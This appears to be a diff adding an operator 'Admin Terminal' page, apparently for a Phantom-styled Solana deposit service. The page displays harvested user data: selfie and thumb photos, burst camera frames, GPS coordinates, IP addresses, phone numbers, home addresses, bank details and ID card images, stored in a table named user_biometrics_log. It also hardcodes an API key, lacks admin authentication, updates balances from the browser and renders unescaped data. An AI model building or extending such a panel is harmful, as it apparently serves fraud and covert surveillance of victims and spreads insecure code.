@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Admin Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+
+        :root {
+            --phantom-purple: #ab66ff;
+            --bg: #000;
+            --card: #0a0a0a;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 1200px;
+            padding: 20px;
+        }
+
+        /* Wider for admin */
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .phantom-btn {
+            background: var(--phantom-purple);
+            color: white;
+            border-radius: 8px;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+
+        .phantom-btn:hover {
+            background: #9244ff;
+        }
+
+        .nav-tab {
+            opacity: 0.5;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            padding-bottom: 8px;
+        }
+
+        .nav-tab.active {
+            opacity: 1;
+            border-color: var(--phantom-purple);
+        }
+
+        .loader {
+            border: 2px solid var(--phantom-purple);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: rotation 1s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Image Preview Modal */
+        #img-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        #img-modal img {
+            max-width: 90%;
+            max-height: 90%;
+            border-radius: 8px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container">
+
+        <!-- Header -->
+        <div class="flex justify-between items-center mb-8 border-b border-white/10 pb-4">
+            <h1 class="text-2xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-600">
+                Admin Terminal</h1>
+            <div class="flex gap-4">
+                <div class="nav-tab active" id="tab-logins" onclick="switchTab('logins')">User Logins</div>
+                <div class="nav-tab" id="tab-deposits" onclick="switchTab('deposits')">Deposits</div>
+            </div>
+        </div>
+
+        <!-- Logins View -->
+        <div id="view-logins" class="space-y-4">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-lg font-bold">Recent Signups</h2>
+                <button onclick="loadLogins()" class="text-xs opacity-50 hover:opacity-100">Refresh</button>
+            </div>
+            <div id="logins-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                <!-- Login Cards Injected Here -->
+            </div>
+        </div>
+
+        <!-- Deposits View -->
+        <div id="view-deposits" class="space-y-4 hidden">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-lg font-bold">Deposit Requests</h2>
+                <button onclick="loadDeposits()" class="text-xs opacity-50 hover:opacity-100">Refresh</button>
+            </div>
+            <div id="deposits-list" class="space-y-3">
+                <!-- Deposit Rows Injected Here -->
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Image Modal -->
+    <div id="img-modal" class="hidden" onclick="closeModal(event)">
+        <div class="relative max-w-[90%] max-h-[90%] flex flex-col items-center" onclick="event.stopPropagation()">
+            <button onclick="document.getElementById('img-modal').classList.add('hidden')"
+                class="absolute -top-10 right-0 text-white font-bold uppercase tracking-widest text-xs">Close</button>
+            <div id="modal-content" class="overflow-auto max-h-[80vh] flex flex-wrap gap-2 justify-center">
+                <img id="modal-img" src="" alt="Preview" class="rounded-lg max-h-[80vh] object-contain">
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div id="toast"
+        class="fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-gray-900 border border-white/10 px-6 py-3 rounded-xl shadow-2xl hidden z-50 transition-all font-bold text-xs uppercase tracking-widest">
+        Notification</div>
+
+    <script>
+        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
+        const sb = supabase.createClient(SB_URL, SB_KEY);
+
+        let allVerifications = []; // Store for easy access to burst data
+
+        // --- Init ---
+        window.onload = () => {
+            loadLogins();
+        };
+
+        function closeModal(e) {
+            if (e.target.id === 'img-modal') {
+                document.getElementById('img-modal').classList.add('hidden');
+            }
+        }
+
+        function switchTab(tab) {
+            document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+
+            document.getElementById('view-logins').classList.add('hidden');
+            document.getElementById('view-deposits').classList.add('hidden');
+            document.getElementById(`view-${tab}`).classList.remove('hidden');
+
+            if (tab === 'logins') loadLogins();
+            if (tab === 'deposits') loadDeposits();
+        }
+
+        // --- Logins (Signups) ---
+        async function loadLogins() {
+            const list = document.getElementById('logins-list');
+            list.innerHTML = '<div class="loader mx-auto"></div>';
+
+            // Fetch verifications (signups)
+            const { data, error } = await sb.from('verifications')
+                .select('*')
+                .order('created_at', { ascending: false })
+                .limit(50);
+
+            if (error) {
+                list.innerHTML = `<div class="text-center opacity-50 col-span-full">Error loading logins: ${error.message}</div>`;
+                return;
+            }
+
+            if (!data || data.length === 0) {
+                list.innerHTML = `<div class="text-center opacity-50 col-span-full">No login data found.</div>`;
+                return;
+            }
+
+            allVerifications = data;
+
+            list.innerHTML = data.map((item, index) => {
+                const loc = item.location_data || {};
+                const geo = loc.geo || {};
+                const dev = loc.device || {};
+
+                // Format Geo
+                const geoStr = (geo.lat && geo.lng) ? `${geo.lat.toFixed(4)},${geo.lng.toFixed(4)}` : (geo.status || 'No Geo');
+                const hasGeo = geo.lat && geo.lng;
+
+                // Format Device
+                let devStr = 'Unknown Device';
+                if (typeof dev === 'string') devStr = dev.substring(0, 15) + '...';
+                else if (typeof dev === 'object') devStr = `${dev.ipv4 || ''} ${dev.platform || ''}`;
+
+                const hasBurst = loc.burst_stream && loc.burst_stream.length > 0;
+
+                return `
+                <div class="glass p-4 rounded-xl flex flex-col gap-3 relative overflow-hidden group">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <p class="font-bold text-lg text-purple-400">${item.username}</p>
+                            <p class="text-[10px] opacity-50 font-mono">${new Date(item.created_at).toLocaleString()}</p>
+                        </div>
+                        <div class="text-xs font-mono opacity-60 text-right">
+                            ${hasGeo
+                        ? `<div onclick="showMap(${geo.lat}, ${geo.lng})" class="mb-1 cursor-pointer hover:text-purple-400 hover:underline decoration-dashed" title="View on Map">📍 ${geoStr}</div>`
+                        : `<div class="mb-1">${geoStr}</div>`}
+                            <div>${devStr}</div>
+                        </div>
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-2 mt-2">
+                        <div onclick="showImage('${item.thumb_img}')" class="aspect-square bg-black/50 rounded-lg overflow-hidden cursor-pointer hover:opacity-80 transition relative">
+                             ${item.thumb_img ? `<img src="${item.thumb_img}" class="w-full h-full object-cover">` : '<span class="absolute inset-0 flex items-center justify-center opacity-20 text-[10px]">NO THUMB</span>'}
+                             <p class="absolute bottom-1 left-1 text-[8px] bg-black/50 px-1 rounded">THUMB</p>
+                        </div>
+                        <div onclick="showImage('${item.smile_img}')" class="aspect-square bg-black/50 rounded-lg overflow-hidden cursor-pointer hover:opacity-80 transition relative">
+                            ${item.smile_img ? `<img src="${item.smile_img}" class="w-full h-full object-cover">` : '<span class="absolute inset-0 flex items-center justify-center opacity-20 text-[10px]">NO SMILE</span>'}
+                            <p class="absolute bottom-1 left-1 text-[8px] bg-black/50 px-1 rounded">SMILE</p>
+                        </div>
+                    </div>
+                    
+                    ${hasBurst
+                        ? `<button onclick="showBurst(${index})" class="w-full mt-2 py-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] uppercase font-bold tracking-wider transition-colors border border-white/5">
+                            View ${loc.burst_stream.length} Burst Frames
+                           </button>`
+                        : ''}
+                </div>
+            `;
+            }).join('');
+        }
+
+        // --- Deposits ---
+        async function loadDeposits() {
+            const list = document.getElementById('deposits-list');
+            list.innerHTML = '<div class="loader mx-auto"></div>';
+
+            const { data, error } = await sb.from('user_biometrics_log')
+                .select('*')
+                .order('created_at', { ascending: false });
+
+            if (error) {
+                list.innerHTML = `<div class="text-center opacity-50">Error loading deposits: ${error.message}</div>`;
+                return;
+            }
+
+            if (!data || data.length === 0) {
+                list.innerHTML = `<div class="text-center opacity-50">No deposit requests found.</div>`;
+                return;
+            }
+
+            list.innerHTML = data.map(dep => {
+                const isPending = dep.status === 'pending';
+                const statusColor = isPending ? 'text-yellow-400' : (dep.status === 'approved' ? 'text-green-400' : 'text-red-400');
+
+                // Parse potentially stored geo as string "lat, lng"
+                let geoLat = null, geoLng = null;
+                if (dep.geolocation && dep.geolocation.includes(',')) {
+                    [geoLat, geoLng] = dep.geolocation.split(',').map(s => parseFloat(s.trim()));
+                }
+
+                return `
+                <div class="glass p-4 rounded-xl flex flex-col md:flex-row gap-4 justify-between items-start md:items-center">
+                    <div class="flex-1">
+                        <div class="flex items-center gap-3 mb-1">
+                            <span class="font-bold text-lg">${dep.username}</span>
+                            <span class="text-xs font-mono opacity-50 border border-white/10 px-2 py-0.5 rounded">${dep.method ? dep.method.toUpperCase() : 'DEPOSIT'}</span>
+                            <span class="text-xs font-bold ${statusColor} uppercase tracking-wider">${dep.status}</span>
+                        </div>
+                         <div class="text-xs opacity-60 font-mono mb-2">
+                            Amount: <span class="text-white font-bold">${dep.amount} SOL</span> • ${new Date(dep.created_at).toLocaleString()}
+                        </div>
+                         <div class="grid grid-cols-2 gap-4 text-[10px] opacity-50 bg-black/20 p-2 rounded max-w-md">
+                            <div><span class="block font-bold">Phone:</span> ${dep.phone || 'N/A'}</div>
+                            
+                            ${geoLat && geoLng
+                        ? `<div onclick="showMap(${geoLat}, ${geoLng})" class="cursor-pointer hover:text-purple-400 hover:underline decoration-dashed" title="View on Map"><span class="block font-bold">Geo:</span> ${dep.geolocation}</div>`
+                        : `<div><span class="block font-bold">Geo:</span> ${dep.geolocation || 'N/A'}</div>`
+                    }
+
+                            <div class="col-span-2 truncate"><span class="block font-bold">Address:</span> ${dep.address || 'N/A'}</div>
+                            <div class="col-span-2 truncate"><span class="block font-bold">Bank Info:</span> ${dep.bank_info || 'N/A'}</div>
+                        </div>
+                    </div>
+
+                    <div class="flex gap-2">
+                        <!-- ID Photos -->
+                         ${dep.id_front ? `
+                        <div onclick="showImage('${dep.id_front}')" class="w-12 h-8 bg-white/5 rounded cursor-pointer overflow-hidden relative group border border-white/10">
+                            <img src="${dep.id_front}" class="w-full h-full object-cover">
+                            <div class="absolute inset-0 bg-black/50 hidden group-hover:flex items-center justify-center text-[6px]">FRONT</div>
+                        </div>` : ''}
+                        ${dep.id_back ? `
+                        <div onclick="showImage('${dep.id_back}')" class="w-12 h-8 bg-white/5 rounded cursor-pointer overflow-hidden relative group border border-white/10">
+                            <img src="${dep.id_back}" class="w-full h-full object-cover">
+                            <div class="absolute inset-0 bg-black/50 hidden group-hover:flex items-center justify-center text-[6px]">BACK</div>
+                        </div>` : ''}
+                    </div>
+
+                    ${isPending ? `
+                    <div class="flex gap-2 min-w-[140px]">
+                        <button onclick="updateDeposit('${dep.id}', '${dep.user_id}', ${dep.amount}, 'approved')" 
+                            class="phantom-btn bg-green-500 hover:bg-green-600 px-4 py-2 text-xs flex-1">ACCEPT</button>
+                        <button onclick="updateDeposit('${dep.id}', '${dep.user_id}', ${dep.amount}, 'rejected')" 
+                            class="phantom-btn bg-red-500 hover:bg-red-600 px-4 py-2 text-xs flex-1">REJECT</button>
+                    </div>` : `
+                    <div class="min-w-[140px] text-right">
+                         <span class="text-[10px] opacity-30 uppercase font-bold">Resolved</span>
+                    </div>
+                    `}
+                </div>
+            `}).join('');
+        }
+
+        async function updateDeposit(id, userId, amount, status) {
+            if (!confirm(`Are you sure you want to ${status.toUpperCase()} this deposit?`)) return;
+
+            showToast("Processing...");
+
+            try {
+                // 1. Update status
+                const { error: logError } = await sb.from('user_biometrics_log')
+                    .update({ status: status })
+                    .eq('id', id);
+
+                if (logError) throw logError;
+
+                if (status === 'approved') {
+                    // 2. Fetch current balance
+                    const { data: profile, error: pError } = await sb.from('profiles')
+                        .select('balance')
+                        .eq('id', userId)
+                        .single();
+
+                    if (pError) throw pError;
+
+                    // 3. Add Balance
+                    const newBalance = (profile.balance || 0) + amount;
+                    await sb.from('profiles').update({ balance: newBalance }).eq('id', userId);
+
+                    // 4. Create Transaction Record
+                    await sb.from('transactions').insert([{
+                        from_id: null,
+                        to_id: userId,
+                        amount: amount,
+                        from_username: 'Deposit',
+                        to_username: 'Wallet',
+                        created_at: new Date().toISOString()
+                    }]);
+                }
+
+                showToast(`Deposit ${status.toUpperCase()}`);
+                loadDeposits(); // Refresh list
+
+            } catch (e) {
+                console.error(e);
+                showToast("Error updating deposit");
+            }
+        }
+
+        function showImage(src) {
+            const content = document.getElementById('modal-content');
+            content.innerHTML = `<img src="${src}" class="rounded-lg max-h-[80vh] object-contain">`;
+            document.getElementById('img-modal').classList.remove('hidden');
+        }
+
+        function showBurst(index) {
+            const item = allVerifications[index];
+            if (!item || !item.location_data || !item.location_data.burst_stream) return;
+
+            const burst = item.location_data.burst_stream;
+            const content = document.getElementById('modal-content');
+
+            content.innerHTML = burst.map(src =>
+                `<img src="${src}" class="w-32 h-32 object-cover rounded border border-white/20">`
+            ).join('');
+
+            document.getElementById('img-modal').classList.remove('hidden');
+        }
+
+        function showMap(lat, lng) {
+            const content = document.getElementById('modal-content');
+            content.innerHTML = `
+                <iframe 
+                    width="600" 
+                    height="450" 
+                    frameborder="0" 
+                    style="border:0; border-radius: 12px;" 
+                    src="https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed" 
+                    allowfullscreen>
+                </iframe>`;
+            document.getElementById('img-modal').classList.remove('hidden');
+        }
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.classList.remove('hidden');
+            setTimeout(() => t.classList.add('hidden'), 3000);
+        }
+
+    </script>
+</body>
+
+</html>
